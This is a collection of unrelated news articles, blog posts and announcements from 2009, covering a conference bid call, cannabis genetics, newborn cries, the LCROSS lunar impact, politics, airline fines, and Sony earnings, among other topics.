Conference facilities proposed location ( a hotel , university , conference center , etc. ) room arrangements ( one room to seat everyone , side rooms available ? ) number of seats available in each room [ detail ] support for multimedia presentations [ detail ] support for recording sessions internet availability for attendees [ detail ] estimated facility cost for 4 days ( e.g. Sunday to Wednesday ) [ detail ] estimated cost for catered lunch ( breakfast ? ) proposed schedule ( e.g. workshop days , presentation days , etc. ) [ detail ] when we need to book , and cancelation policies
People name and email of main contact person names of others who could help with local arrangements
General provide websites or other contact information advantages and disadvantages of this venue good and bad dates ( e.g. due to availablity , weather , or other events ) [ detail ] other costs ( e.g. for a banquet dinner ) explain how estimates are made specify the currency used for price estimates
Bids should be sent to --> please enable Javascript to see this email address <-- by Monday , January 4 , 2010 .
If your bid is incomplete at that time , please send what you have ( maybe with a note about when you will have more information ) .
By tradition , consecutive ILCs are not held in the same region .
Thus bids from the US East Coast will be considered , but other locations will be favored .
Feel free to propose and organize bids on --> please enable Javascript to see this email address <--
Please do not post details or compare one bid against another until after the submission deadline .
The goal is to find options , not limit them .
Hosting an ILC requires a significant commitment from the local organizers .
While the ALU plans to relieve that burden by having others handle things like the program , certain tasks require local contacts .
In particular , a local company is created to handle payments for catering and conference facilities , collect registration fees , and provide a full account of expenses when the conference is finished .
This would completely overwhelm a single organizer , so a local team is necessary .
Preparing a bid together may be a good teambuilding exercise ...
The ALU would like to thank you in advance for each bid to host ILC 2011 .

September 16 , 2009 – Scientists at the University of Minnesota have identified the genes in cannabis that allow the plant to produce THC .
Finding the genes opens the path to either create drug - free hemp plants for industrial purposes , or to develop plants with much higher concentrations of the psychotropic chemical .
Publishing in the Journal of Experimental Botany , the researchers note that they specifically targeted the genes responsible for generating the drug - filled hairs highlighted in many a High Times photo spread .
By impairing or encouraging the growth of those hairs , scientists could gain precise control over the level of THC in the crop .
This development has important consequences for both the medicinal and industrial use of hemp .
On the industrial side , states like North Dakota have been looking to change state law to allow them to raise hemp as a cash crop , for oil and rope production .
The ability to create hemp that does n’t contain any banned substances would allow Dakotans to sow the crop without any changes in the law .
On the opposite end of the spectrum , precise control of the doses of THC found in pot could greatly enhance the medicinal marijuana industry .
Currently , dosage is controlled through haphazard breeding and selection , not precise measurements as with most other medications .
It should also be noted that THC is not the only psychoactive compound found in marijuana , so more research is needed before the University of Minnesota scientists can completely control the potency of their crops .
Finally , how this new discovery will affect the pizza delivery business remains to be seen .

From their very first days , the cries of newborns already bear the mark of the language their parents speak , scientists now find .
French newborns tend to cry with rising melody patterns , slowly increasing in pitch from the beginning to the end , whereas German newborns seem to prefer falling melody patterns , findings that are both consistent with differences between the languages .
This suggests infants begin picking up elements of language in the womb , long before their first babble or coo .
Prenatal exposure
Prenatal exposure to language was known to influence newborns .
For instance , past research showed they preferred their mother 's voice over those of others .
Still , researchers thought infants did not imitate sounds until much later on .
Although three - month - old babies can match vowel sounds that adults make , this skill depends on vocal control just not physically possible much earlier .
However , when scientists recorded and analyzed the cries of 60 healthy newborns when they were three to five days old — 30 born into French - speaking families , 30 into German - speaking ones — their analysis revealed clear differences in the melodies of their cries based on their native tongue .
Imitating Mom
The way babies imitate melody patterns relies just on a command over their voiceboxes they had before birth , instead of the more advanced control of their vocal tracts they need for vowel sounds .
As such , they can begin mimicking their mothers " at that early age , " said researcher Kathleen Wermke , a medical anthropologist at the University of Würzburg in Germany .
" Newborns are probably highly motivated to imitate their mother 's behavior in order to attract her and hence to foster bonding , " Wermke said .
The researchers conjecture that the development of spoken language is rooted in melody , and that these findings support their idea .
" Music and language might have co-evolved for a certain time during evolution and share a primordial form of communication system , " Wermke told LiveScience .
The scientists detailed their findings online November 5 in the journal Current Biology .
This morning , at a hastily arranged press conference , NASA scientists faced a barrage of questions from a frequently skeptical press corps .
The questions , however , did not focus on budget issues or plans for future manned missions ; instead , the press was concerned about the apparent absence of any visible ejecta from a crater that the Agency had just created by crashing the LCROSS probe into the Moon .
NASA seemed very pleased with the data it has obtained , including detailed spectroscopic data , but the press was reflecting the public 's desire for a geyser of debris to rise from the impact site and into the field of view of many of the telescopes that were watching .
Regardless of the public expectations , LCROSS clearly performed as planned .
It recently separated from the Centaur stage that helped bring it to lunar orbit , and both of the spacecraft were directed towards the Cabeus crater at the Moon 's south pole .
The Centaur vehicle went first , creating an impact that could be observed from instruments on LCROSS , which followed it in .
Less than four minutes later , LCROSS itself struck the lunar surface .
The impacts were observed with a variety of telescopes on Earth and in Earth orbit , although the actual site of the impact was obscured by the Cabeus crater walls .
Clearly , a lot of people were hoping that dropping hardware onto the lunar surface would create a spray of debris that would rise above the crater walls , and be visible to the Earth - based observatories .
Unfortuntely , from the perspective of the Earth , LCROSS struck not with a bang , but a whimper , as if it had landed on a comfy pillow .
NASA scientists spent a lot of the ensuing press conference trying to explain why this did n't necessarily mean that scientists would be disappointed with the data pouring in from instruments around the globe .
Anthony Colaprete , the scientific lead for LCROSS , showed some of the spectroscopic data obtained by the probe 's instruments as they approached the lunar surface .
From the UV down to the infrared , a time lapse showed signals dropping as LCROSS entered the shadowed region of the crater , until a sudden blip indicated the Centaur 's impact .
The spatial resolution of the instrument showed that there was a crater in the neighborhood of 18 - 20 m carved out by the impact .
A flash detected by LCROSS ( inset , lower right ) indicates the Centaur impact .
The woman who coordinated the imaging performed by other observatories , Jennifer Heldmann , described some of the data obtained by a massive network of telescopes that followed the impact , saying , " we have images , we have video , we have graphs with squiggly lines , which scientists love . "
The observatories that were able to image the event ranged from Arizona and New Mexico ( Apache Point , Magdalena Ridge , and the Vatican Observatory ) , through California 's Mount Wilson and Palomar sites , and included a lot of the best hardware in Hawaii , such as the Keck , Gemini , and Subaru telescopes .
Watching from space were the Lunar Reconnaissance Orbiter , which was launched with LCROSS , and the newly refurbished Hubble Space Telescope .
A few private satellites that normally do Earth imaging , IKONOS and GeoEye - 1 , were also redirected to the Moon for the event .
Heldmann showed video from a few observatories that spanned the time of the impact , which decisively revealed nothing — hence all the questioning from the press in attendance .
Still , it 's possible that imaging processing or specific areas of the spectrum will reveal something , and several of the scientists who spoke were anxious to see what came down from the Hubble , which should have started transmitting its data by the time this article is published .
Heldmann also mentioned that the Kitt Peak spectral data indicated ionized sodium , something that Colaprete indicated was picked up by LCROSS as well .
That set off another set of skeptical questions : if scientists had spent the time to pick sodium out of the spectrum , surely they had looked for water ?
Colaprete tried to explain that sodium vapor is known to be present in the lunar atmosphere , and it creates a distinct spectral line in a clean area of the visible spectrum .
Water is typically detected in a crowded area of the IR spectrum , which makes it a lot more challenging to pick out .
He simply did n't have time to examine it in detail ( in part because he was busy making slides for the press conference ) , and probably would n't discuss it if he had , since detailed analysis of the data would be needed before he'd feel comfortable saying anything conclusive .
At the moment , that data was still being shuffled around on thumb drives to everyone who was in place to perform the relevant analysis .
In any case , Colaprete noted that excited sodium ions were an indication that something energetic had happened on the lunar surface , so the absence of a visible plume might simply indicate that the hardware had gone into a slope that forced the plume out sideways , or had impacted on solid rock that limited the amount of material sent upwards .
Overall , the press conference made it clear that the mission worked precisely as planned , in that there 's a wealth of observational data to analyze — NASA 's Mike Wargo said that scientists are currently just " drinking from the firehose " in order to deal with the volume .
The recent findings that suggest the existence of lunar water cycle adds a degree of urgency to the work , but the area struck by LCROSS has n't seen the sun for as long as two billion years , so there was almost certain to be something interesting lurking there .

Good Without God : What a Billion Nonreligious People Do Believe
by Greg Epstein
( William Morrow , 2009 )
On Monday , October 26 , The United Coalition of Reason launched a “ Good without God ” campaign to raise the visibility of local nontheistic groups in communities across the country .
Their billboards , big white lettering against a background of a fluffy - clouded sky , ask “ Are You Good Without God ? ”
The answer : “ Millions are . ”
It ’s like a kinder , gentler Atheist Bus campaign .
The CoR campaign ties into the release of Greg Epstein ’s book Good Without God : What a Billion Nonreligious People Do Believe .
Epstein , the Humanist Chaplain of Harvard University , is planning a 12 - city tour , coordinated with United CoR .
He also plans to participate in community service projects in many of the cities , as part of “ Secular Service Day , ” an idea designed “ to unite secular groups across the country in the interest of public service , and to demonstrate our commitment to leading full and ethical lives . ”
I first connected with Epstein while conducting research for The New Atheist Crusaders and Their Unholy Grail .
When I met him , I was pretty drained from sitting through one too many Dawkins vs. D’Souza bestseller battles : great fodder for cable network TV news shows but no space to really interact with someone who disagrees .
But I sensed when I first spoke with Epstein that he was similarly fed up with faith fights .
Also , he wanted to connect with those Christians who wanted to explore areas where humanists and Christians can come together : issues of common concern such as caring for the environment , ending sex trafficking , and keeping church and state as separate entities .
In the months since I first contacted Epstein , I began to notice how the atheist - Christian debate was softening into a real dialogue .
While there was plenty of material berating believers for their faith , I began to receive books such as The Little Book of Atheist Spirituality and An Atheist Defends Religion : Why Humanity is Better Off with Religion Than Without It .
Writers like these were trying to help people come to some understanding regarding our collective appreciation of the mysterious .
In Good without God , Epstein illuminates the positive components of atheism by exploring the basic tenets and history of humanism .
As a Christian , I appreciated Epstein ’s gentle ability to guide me through his reasoning without insulting my own tradition — though he does cite religious leaders such as the Rev. Rick Warren of Purpose Driven Life fame , who do not extend the same courtesy to atheists .
Epstein gears his message primarily towards those who do not profess to have a belief in God .
Polls such as those conducted by USA Today indicate this group is on the rise , with 15 percent of Americans who do not identify with any religion .
As with all statistics the answers may be contingent on how the questions are framed .
For example , this current survey indicated that 51 percent of those who listed “ none ” for their religion still believe in God or a higher power .
But these statistics do indicate that people no longer feel the social pressure of previous generations to identify with a religious group .
Epstein admits that his effort to bring human beings together is like herding cats .
But he feels this effort is worthwhile , especially considering that the nonreligious population is exploding .
And the human need for caring and community remains .
Epstein chose the book ’s bite - sized title slogan “ Good Without God ” because he felt it draws attention not only to the words “ without God ” but to the concept of “ Good . ”
For humanists like Greg , this phrase reminds them that as nonreligious people they are for something , not just against something .
Can atheists and Christians move past our prejudices and our distrust to work together for a common good ?
Social entrepreneur Shannon Hopkins has noted that in the United Kingdom , Christians often spearhead social enterprise ventures , and humanist collectives in the United States have created events like the Feast Conference 2009 .
Occasionally , one can find a convergence of the secular and spiritual .
Several Christians involved with The Nomi Network invited me to a recent screening of the film Call + Response .
It ’s rare to see the faithful strutting with the fashionistas , but these groups came together to expose the world ’s dirtiest secret : there are more slaves today than at any time in human history .
The Not For Sale Campaign , one of the driving forces behind this documentary , brings together a wide swathe of people including faith groups , students , teachers , artists , and the business community to mobilize together for this common cause .
Time will tell if this grassroots movement for good can produce real results .

Enid Blyton 's work contained too many pixies , BBC memos revealed Children 's author Enid Blyton was banned from the BBC for nearly 30 years because her work was considered " small beer " , archive documents have revealed .
The best - selling writer unsuccessfully approached the corporation several times to get her material on the radio .
Executives considered the Famous Five and Noddy creator " second - rate " and lacking literary value , according to 18 newly released letters and memos .
She first pitched ideas in 1936 but did not appear on Woman 's Hour until 1963 .
' Pinky - winky - Doodle - doodle '
A memo about a short story stated : " Not strong enough .
It really is odd to think that this woman is a best - seller .
It is all such very small beer . "
Another simply said " reject " .
Head of the BBC schools department Jean Sutcliffe said in an internal memo dated 1938 : " My impression of her stories is that they might do for Children 's Hour but certainly not for Schools Dept , they have n't much literary value .
I and my stories are completely banned by the BBC as far as children are concerned - not one story has ever been broadcast
Enid Blyton
" There is rather a lot of the Pinky - winky - Doodle - doodle Dum - dumm type of name - and lots of pixies - in the original tales . "
She added that they were " competently written " .
In August 1940 , the BBC 's radio show Children 's Hour rejected her play The Monkey and the Barrel Organ , saying it was " stilted and long winded " .
In 1950 programme head Derek McCulloch , known as Uncle Mac , confirmed the existence of the ban in a " strictly confidential and urgent " memo .
Ms Blyton was also clearly aware of it .
In a memo to a BBC producer she wrote : " I and my stories are completely banned by the BBC as far as children are concerned - not one story has ever been broadcast , and , so it is said , not one ever will be . "
In 1954 , responding to a query from the Woman 's Hour editor as to whether Blyton could be interviewed , Ms Sutcliffe said she was concerned that the BBC would become " just another victim of the amazing advertising campaign which has raised this competent and tenacious second - rater to such astronomical heights of success . "
The corporation eventually decided her material was fit for broadcast and she appeared on Woman 's Hour in 1963 .
A new drama telling the life story of the author , starring Helena Bonham Carter , is to be broadcast on BBC Four at 2100 GMT on Monday .

Let ’s be clear right off the bat : this is no rumor .
The Motorola DROID is steaming towards a release on O2 Germany under the name MILESTONE .
The news of this came from a German blog which leaked a photo of a business guide ( pic after the jump ) as well as an official O2 device price list which shows the MILESTONE coming in at 404.20 € or $ 594.93 USD before taxes ( and subsidies ) .
If that is n’t proof enough , we pulled the image above from from O2 ’s site after a simple Google query .
No doubt there will be some people Stateside that refuse to go over to Verizon to get the DROID ( we get a huge kick out of network fanboyism ) , so how many of you would be willing to import one of these Android 2.0 behemoths even if it lacks US 3G ?
Thanks , Schreifels !

Sen . Jim DeMint of South Carolina is reinvigorating the GOP's Newt Gingrich - era mission .
He 's returning Republicans to a position as the entrenched opposition and self - declared " party of no , " opposing President Obama on every front .
This summer , DeMint even said Republicans should make health care reform " Obama 's Waterloo . "
But DeMint 's strategy , though effective in Washington , has raised questions about its effectiveness .
DeMint 's home state of South Carolina is in some turmoil over whether his anti-Obama promotes national party goals at the state 's expense .
As DeMint leads the charge for a disciplined and ideologically pure GOP , both conservatives and non-conservatives worry about the future of the party .
Republican Discipline a Liability , Not Asset Nate Silver debunks Sen. DeMint 's greatest strength .
" Certainly , there is an art to vote - whipping -- one which , for instance , Nancy Pelosi understands a lot better than Harry Reid .
But also , a lot of it is a question of what long - term price you 're willing to pay for short - term gains .
And a lot of it is also circumstantial : the smaller your conference and the less ideologically diverse , the easier that loyalty tends to be .
If the only two Republican senators were Tom Coburn and Jim DeMint , well then , by golly , they'd be really , really , really disciplined .
They 'd also be completely powerless to stop the 98 Democrats . "
A Purer But Smaller DeMint - Led GOP
The New Yorker 's Peter Boyer calls DeMint " the de-facto voice of the Republican opposition " who " tapped into the wrath of the conservative base . "
But Boyer warns that the GOP " has now become a captive of the DeMint wing , " the purity of which is " the arithmetic of political defeat . "
Boyer writes , " There is a risk in a strategy of opposition ; too ardently expressed , it can make Republicans seem extreme , as Representative Joe Wilson 's ' You Lie ! ' outburst during the President 's health - care speech to Congress on September 9th demonstrated . "
He concludes , " The question remaining for many Republicans is whether the Party can develop a strategy beyond opposition , an argument for governing that will expand its appeal beyond it ideological core . "
Opposition - Only Is No Strategy Conservative blogger Mark Thompson worries .
" The conservative wonks simply are n't doing their jobs .
What they are doing is picking apart liberal proposals , picking apart conservative proposals , attacking the low - hanging fruit of conservative extremism , and occasionally making suggestions to liberals on ways of either improving liberal proposals or making those proposals more palatable to conservatives .
What they are not doing , and largely are not even trying to do , is to drive the GOP agenda .
They are , in effect , content to leave the GOP agenda as little more than ' vote no on everything ' and tear down whatever the liberals do , " he writes .
" Should the wonks choose to remain paralyzed in their willingness to engage their own base and to risk angering another leg of that outdated coalition , they will only ensure that Republicans remain incapable of governing on a national level for a longer time than is necessary . "
Discipline Stifles Innovation Conservative blogger Rod Dreher argues that an obsession with the party line makes dissent , and thus growth , harder .
" You can't convince people to change if they are not willing to take what you have to say seriously .
It seems to me that the kind of things people like Frum et alia criticize among the conservative base are things that have to do with the ideological ossification that is preventing the GOP from thinking and acting creatively to change with the times , and to figure out how to make conservatism relevant and responsible in a different set of circumstances than that which brought Reagan to power .
As long as the conservative base is more interested in the old custom of heretic - hunting than it is in thinking creatively , dissidents will have little or no power to affect the GOP agenda .
And there 's not much they can do about it . "
Theatrics Over Ideas Former Bush speechwriter Matthew Latimer decries the absence of ideas .
" Our Republican Party is gripped with a common Washington affliction : consultant fever .
This is a very contagious , bipartisan disease .
It causes those in its grip to advance themselves by resorting to tactics and theater rather than the much harder work of explaining to people why our ideas are better .
Over the past several years , we ’ve let this disease become chronic in the Republican Party .
It does n’t have to be this way . "

Merkavim ’s promotional video shows Israeli soldiers boarding an armored bus .
OPT
Volvo Buses is co-owner of Merkavim Ltd. , an Israeli transport technology company .
Another shareholder in the company is Mayer ’s Cars and Trucks , the exclusive Israeli representative of companies from the Volvo Group .
According to Merkavim ’s website , the company was chosen by Volvo as “ its major body builder in the Middle East . ”
However , the Who Profits from the Occupation ?
project recently reported that Merkavim manufactures an armored version of Volvo ’s Mars Defender bus for the Israeli public transport company Egged .
Egged uses the Mars Defender to provide bus services for illegal settlements in the occupied West Bank .
Merkavim proudly announced on its website that the Mars Defender offers protection and ultimate comfort when traveling through war zones or routes susceptible to terrorist attacks .
In a promotional video the armored bus is shown driving along Israel ’s wall in the West Bank and crossing checkpoints ( http://www.merkavim.co.il/upload/defender.wmv, accessed 6 October ) .
In another video on Merkavim ’s homepage , Volvo ’s Senior Vice - President of Business Region Europe , Lars Blom , declares that “ Three core values that are very important to us are quality , environmental care and safety . …
[ T ]he products we are developing with Merkavim also deliver these three core values plus reliability ” ( http://www.merkavim.co.il/movies_library/merkavim.wmv, accessed 7 October 2009 )
According to Merkavim , in the video promoting the bus , the Mars Defender “ looks like any other modern bus , ” but it is “ the world ’s most armored bus . ”
Indeed , the company calls it “ the bus that saves lives ! ”
As the narrator explains that the bus is “ designed to safeguard the most precious cargo , ” the camera pans over Israeli soldiers lining up to board the bus and on patrol with their machine guns at the ready .
The video explains that Israel has “ adapted its world renowned expertise in military and defense technologies to deal with ” the “ growing threat ” of “ terrorists and hostile forces . ”
It adds that Merkavim “ blends this state of the art know - how with its own expertise ” to produce the Mars Defender .
Built on a Volvo chassis , the Mars Defender ’s sides , front , roof and floor are shielded with steel armored panels and it is fitted with bullet - and explosion - proof armored glass windows as well as “ run- flat ” tires .
According to the company , these safety measures allow the bus to withstand “ grenades , car bombs , roadside charges and 7.62 caliber armor-piercing bullets . ”
Merkavim claims that these features are needed because “ people trust this bus with their lives . ”
The 2004 advisory opinion of the International Court of Justice on Israel ’s wall in the West Bank confirmed that settlements violate Article 49 of the Fourth Geneva Convention .
Article 49 explicitly states that the Occupying Power is not allowed to deport or transfer parts of its own civilian population into the territory it occupies .
Bus services with Volvo subsidiary ’s Mars Defender armored buses facilitate the maintaining of illegal settlements in the OPT .
In its Code of Conduct , the Volvo Group commits itself to support and respect the protection of human rights and to ensure that it is not complicit in human rights abuses .
However , by providing construction and transportation equipment that facilitates Israel ’s occupation , the company violates this Code of Conduct on a daily basis .
With increasing calls for boycott of and divestment from companies that support Israel ’s occupation , Volvo Group can expect activists around the world to put pressure on responsible investors to divest from the company and to call on public bus companies not to buy Volvo buses .

JW Appeals to Supreme Court to Consider Lawsuit Challenging Hillary Clinton ’s Eligibility to Serve as Secretary of State
Judicial Watch , the public interest group that investigates and prosecutes government corruption , announced today that on November 3rd it filed a “ Notice of Appeal ” as a first step in asking the United States Supreme Court to consider its lawsuit filed on behalf of U.S. Foreign Service Officer David C. Rodearmel challenging Hillary Clinton ’s constitutional eligibility to serve as Secretary of State [ Rodearmel v. Clinton , et al. , ( Civil Action No.09 - 171 ) ( D.D.C. ) ] .
Following oral argument on September 16 , a special three - judge panel of the U.S. District Court for the District of Columbia dismissed the challenge on October 29th , ruling that Mr. Rodearmel lacked “ standing ” to bring the lawsuit .
The panel did not rule on the constitutional merits of the lawsuit .
Judicial Watch ’s lawsuit , filed on January 29 , 2009 , maintains that the “ Ineligibility Clause ” of the U.S. Constitution prohibits Hillary Clinton from serving as Secretary of State and that Mr. Rodearmel cannot be forced to serve under the former U.S. Senator , as it would violate the oath he took as a Foreign Service Officer in 1991 to “ support and defend ” and “ bear true faith and allegiance ” to the Constitution of the United States .
According to Article I , section 6 of the U.S. Constitution : “ No Senator or Representative shall , during the Time for which he was elected , be appointed to any civil Office under the Authority of the United States , which shall have been created , or the Emoluments whereof shall have been encreased during such time . ”
The text of the provision is an absolute prohibition and does not allow for any exceptions .
However , as Judicial Watch notes in its complaint for Mr. Rodearmel , “ the ‘ compensation and other emoluments ’ of the office of the U.S. Secretary of State increased during Mrs. Clinton ’s tenure in the U.S. Senate , including as many as three times during the second , six - year term to which she was elected . ”
Congress attempted to circumvent this constitutional provision by “ rolling back ” compensation for the position of Secretary of State to the level in effect on January 1 , 2007 .
Judicial Watch ’s complaint maintains : “ This [ fix ] does not and cannot change the historical fact that the ‘ compensation and other emoluments ’ of the office of the U.S. Secretary of State increased during Mrs. Clinton ’s tenure in the U.S. Senate . ”
With respect to the issue of standing , Judicial Watch contends that Mr. Rodearmel “ has demonstrated that he is being injured in his employment by being required to serve under , take direction from , and report to a constitutionally ineligible superior , Mrs. Clinton ” and that he has “ been placed in a position where he either must violate his oath of office or risk substantial , adverse consequences to his employment . ”
The “ Ineligibility Clause ” is seen by many as designed by our Founding Fathers to protect against corruption , limit the size of government , and ensure the separation of powers among the three branches of government .
At least two other presidential appointees , Interior Secretary Ken Salazar and Army Secretary John McHugh are also ineligible to serve in their positions under the “ Ineligibility Clause . ”
The lawsuit was reviewed on an expedited basis by a special three - judge panel of the U.S. District Court for the District of Columbia .
Under applicable law , any appeal goes directly to the U.S. Supreme Court .
“ Our client ’s goal is to vindicate the U.S. Constitution , ” said Judicial Watch President Tom Fitton .
“ The Constitution clearly prohibits Hillary Clinton from serving as Secretary of State until 2013 .
We hope the Supreme Court assumes jurisdiction over this matter and puts a stop to this attempt to do end - run around the Constitution . ”
Why an Interest Rate Hike Wo n't Pop the " Gold Bubble "
Here at The Daily Reckoning we tend to be of the mind that gold is in a genuine bull market , one that began about 10 years ago .
It may have its moments of frothiness or corrections along the way , but it ’s still trending upward .
Needless to say there are those that disagree , and who believe gold is part of a forming asset bubble .
The Daily Gold takes this “ gold bubble ” perspective to task for several reasons .
For starters , “ it is real interest rates that matter .
Rates need to be 2 - 3 % above the level of inflation . ”
Basically , in order for an interest rate hike to make a difference , and to have an impact on the gold price once inflation is accounted for , rates would have to go up much higher than seems plausible given the current high and rising unemployment .
Also important , “ most people expect the US $ to lose value .
If it loses 5 % a year and inflation is 2 - 3 % , then rates really need to be 10 % to poke the bull in gold . ”
So , in this respect it could be difficult to spur investors to choose a weakening dollar , with a mediocre interest rate , over potentially constant or steadily increasing value in gold relative to the dollar .
You can read more details in The Daily Gold ’s post on the interest rate argument against gold .
The Australian skeptics are still hammering away at Meryl Dorey , the Australian Vaccination Network , and their ( to be charitable ) distortions of the truth .
It 's nice to see .
And what we have seen is that , like a pinata when that critical blow is made , a torrent of dumbosity comes out .
Which brings up an interesting point .
A lot of people think that using an ad hominem -- an argument that attacks the person and not the issue -- is a logical fallacy .
That 's not necessarily the case .
For example , if someone on the street walks up to me and say , " Aliens speaking with the voice of Glenn Beck are sitting on my shoulders and forcing me to eat brussel sprouts , and Obama 's health care plan will set up death panels , " then there is some merit in questioning the person 's sanity before wondering if what they say about the health care plan is true .
So if you 're inclined to give Meryl Dorey and her AVN group the benefit of the doubt , you might want to read up on some of the other , um , stuff they believe .
It may open your eyes .

QALAT - Doctors at a hospital in Qalat , capital of Zabul Province in southern Afghanistan , are treating a brutally tortured woman whose husband cut off both her ears and nose , broke her teeth and shaved her head only three months after their marriage .
The victim , 16 - year - old Nazia , is also suffering from psychiatric distress due to her experience , according to a doctor in Qalat hospital .
From her bed in Qalat hospital Nazia told IRIN her story :
“ My family wedded me to Mumtaz [ a 40 - year - old man ] some three months ago , in Pakistan .
Soon after our marriage we moved to his house in Qalat where his relatives told me he had another wife who had died a year ago .
In Qalat my husband was jobless and was always complaining about economic problems .
Two weeks after we moved to our new home he beat me for no obvious reason .
“ One day I asked him to let me go to a party at my in - laws .
He agreed and said I should return home in the afternoon .
That day , although I came home early , I found him very angry .
He beat me again , worse than the first time , and warned that he would kill me if I stepped outside the home again .
He also told his brother and nephews not to come to our house in his absence .
“ Day - after - day Mumtaz ’s suspicion increased .
He was thinking other men were visiting me while he was not at home .
He did not listen to my pleas and was always saying that all women are bad and unfaithful to men .
During this time he often beat me with a stick .
“ One night he hit me so much that I fainted .
When I regained consciousness I found my head had been shaved .
I cried so much , but he did not care .
“ One week later he knocked me down , bound my hands , and then broke my teeth with a stone .
He also poured boiling water on my feet .
After this I could not walk and was in a lot of pain , but he said I was only pretending .
“ No one was coming to our house so I could not tell anyone about my situation .
I had nowhere else to go either .
My family lives in Pakistan .
“ One night I could not cook dinner for him because I could not stand on my feet .
He got so upset when he found that there was nothing for him to eat .
He started beating me .
Again , he bound my hands with a piece of cloth .
I felt a terrible pain in my left ear and then blood was flowing down my face .
I thought that he wanted to kill me so I started screaming .
Then I felt a similar pain in my right ear and more blood .
“ I tasted a mixture of blood and tears in my mouth while my voice was fading .
I felt the worst pain in my life only a few seconds later when my husband used his knife to cut off my nose .
I fainted .
“ Now I do not know where my husband has gone . ”
Although America West and US Airways combined four years ago , the " new " airline still feels scattered turbulence stemming from the merger .
The latest evidence came Wednesday , when the Federal Aviation Administration announced a proposed $ 5.4 million fine for US Airways for a series of maintenance violations over a nine - month period that ended in January .
It is one of the largest proposed penalties of its kind against a major airline .
But the proposed fine is much less than the record $ 10.2 million proposed against Southwest Airlines last year for maintenance lapses .
The FAA 's allegations center on missed inspections , some dictated by the FAA , others by the airline 's maintenance program .
There are no allegations that the airline was ignoring needed repairs for its fleet of more than 600 planes or putting passengers in danger with its missteps .
The agency says US Airways flew nearly 1,700 flights on eight planes that were not in compliance .
The time period was May 2008 through January .
In one case , the FAA said , the carrier flew 855 flights on an Airbus A320 that was not in compliance with the airline 's engine - repair maintenance requirements .
Fifty - one of those flights were flown after the FAA notified the airline in December that it was not in compliance .
US Airways Chief Operating Officer Robert Isom said that the lapses were largely due to inspections overlooked during the combination of the two airlines ' computerized maintenance - records systems .
That did not occur , he said , until 2008 , a year after it received a joint operating certificate from the FAA .
" As maintenance programs were revised and rewritten and those were put into computer tracking systems , there was some fallout , " he said .
The airline also ran into major flight problems when it combined its computer - reservation systems , and it is still trying to integrate its flight crews .
Isom said that the airline reported some of the maintenance issues to the FAA and that the agency brought others to its attention .
As a result of the series of maintenance deficiencies discovered , the FAA late last year decided to do a comprehensive review of US Airways ' maintenance programs , policies and personnel , Isom said .
" The FAA sat down with us and said , ' Hey , you really need to address these , and you need to address them quickly and comprehensively , ' " Isom said .
He said the airline was not forced to ground planes en masse to address the problems .
The review was completed in August .
" This is something that we 've known about for a while . . . and , really , closed out most everything to the FAA 's satisfaction a couple months ago , " he said .
Bill Waldock , professor of safety science at Embry - Riddle Aeronautical University in Prescott , said the FAA 's findings against US Airways appear to be mostly paperwork errors , rather than poor - maintenance procedures .
" I 'm not minimizing it or saying it is n't important , but it does n't rise to the level where it is an obvious ( flight ) hazard that 's been ignored , " he said .
He said anytime you merge two airline - safety programs with countless details about each plane in the fleet , " you 're going to find things fall through the cracks . "
Waldock said the FAA 's decision to do a comprehensive review of US Airways ' maintenance programs shows the " system is working . "
Waldock found the agency 's allegations and a $ 3.8 million proposed fine against United Airlines , also announced Wednesday , more significant .
The FAA says United flew one Boeing 737 on more than 200 flights when it was not in an " airworthy condition . "
The agency said the Chicago - based airline did not follow its own maintenance procedures in December 2007 when towels instead of protective caps were used to cover openings in the " oil sump " area of the engine .
The plane had to return to Denver after shutting down an engine because of low oil - pressure indications , the FAA said .
" I think the FAA was a little bit more concerned about something like that , " Waldock said .
Isom said US Airways expected a fine for the violations but would not say whether it expected the proposed amount to be as high as $ 5.4 million .
The airline has not disputed any of the findings and has cooperated fully with the FAA , he said .
US Airways has 30 days to respond to the agency .
In determining proposed fines , the FAA has a formula that includes the number and type of violations and how many flights were involved during the period when the airline was not in compliance .
In some cases , such as US Airways ' , the proposed fine covers multiple issues ; in others , such as the United case , the fine covers a single matter .
That makes it difficult to compare the size of fines .
Airlines often negotiate a lower settlement .
Southwest , which was accused of maintenance lapses on the fuselage , settled earlier this year for $ 7.5 million .
' It 's women competing against women ' ... Sarah Murdoch on the cover of Women 's Weekly .
Ms Murdoch said she does n't like airbrushed photographs of herself .
" I think when I 'm retouched in photographs it 's worse , because when people see me in real life , they go , ' Oh , God , is n't she old ? , " she told the magazine .
She said she wonders what young women who get Botox will look like when they 're older .
" It makes me mad that we can't embrace the beauty of ageing , because we 're all going to do it . "
Her husband would be " horrified " if she ever did anything to her face , she said .
" It 's women competing against women , they 're not doing it for their husbands .
" It 's because their best friend does n't have as many lines as they have , maybe .
" God forbid if I ever do decide to do something ! "
During the interview Ms Murdoch told the magazine she hoped they would n't airbrush her photograph too much and agreed when editor Helen McCabe asked if a completely non-airbrushed photo could be used .
" It 's certainly not been done in any recent history of the , " Ms McCabe told AAP .
Ms McCabe said the magazine often received letters about their use of airbrushing but Ms Murdoch 's example may not set a precedent .
" I can't possibly commit to that , I 'm a realist .
" There are real business imperatives why magazines have gone this way , it 's a very competitive industry and I 'm at this stage just taking a little baby step and seeing how this goes for now . "
She said she was interested to see what kind of debate was stirred up by the issue of the magazine , which goes on sale on Wednesday .
" The one point I have to make is that this is possibly one of , if not the most beautiful woman in Australia that I 've done this to , so the risk is not that high . "
Meanwhile , Sarah Murdoch and former Cosmopolitan editor Mia Freedman have helped launch a report today calling for a national strategy on body image .
The Government will consider recommendations calling for standardised sizing on women ’s clothing sold in Australia and a voluntary code of conduct calling on the media to show more diverse body shapes .
A formal response to the report is expected early next year .

AAP with Yuko Narushima
The surge in interest in Michael Jackson 's music was not enough to save Sony from its fourth quarterly loss in a row , but there are signs of optimism for the Japanese media group .
The consumer electronics and entertainment company .
Yesterday it reported losses of ¥ 26.3 bn ( £ 175 m ) in the three months from July .
Sony said it expected annual losses of ¥95bn this year , a slight improvement on its initial estimate of ¥ 120 bn ..
Sony 's susceptibility to the global recession was underlined this year when it reported a ¥ 98.9bn loss for 2008 .
Its Sony / ATV music publishing venture benefited from the boost in sales of Michael Jackson albums following his death in June .
Sales of PlayStation 3 game consoles also picked up , but Sony is heading for its first consecutive annual loss since it became a listed company in 1958 .
Sales in its gaming division improved after a 25 % cut in the price of the PS3 last month .
Sony sold 3.2 m PS3s in the quarter compared with 2.4 m in the same period last year .
The price cut helped the PS3 outsell Nintendo 's Wii console in the US for the first time last month .
